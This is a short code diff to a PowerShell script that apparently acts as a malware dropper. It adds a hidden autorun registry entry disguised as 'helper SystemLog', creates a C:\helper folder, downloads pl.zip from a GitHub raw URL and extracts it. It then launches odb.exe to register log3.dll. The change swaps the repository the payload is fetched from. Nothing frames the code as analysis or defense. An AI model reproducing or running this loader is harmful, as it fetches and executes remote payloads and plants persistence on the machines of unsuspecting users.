@@ -5,7 +5,7 @@ else {
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'C:\helper\odb.exe /a {REGSVR C:\helper\log3.dll}' -Force ;
 
 powershell -w 1 New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ;
-wget "https://github.com/RQ3Xd/1/raw/refs/heads/main/pl.zip" -o C:\helper\pl.zip; start-sleep 3 ;
+wget "https://github.com/citraadvertising/X/raw/refs/heads/main/pl.zip" -o C:\helper\pl.zip; start-sleep 3 ;
 Expand-Archive -Path "C:\helper\pl.zip" -DestinationPath "C:\helper\" -Force ;
 
 start-process C:\helper\odb.exe -Argument "REGSVR C:\helper\log3.dll" ;
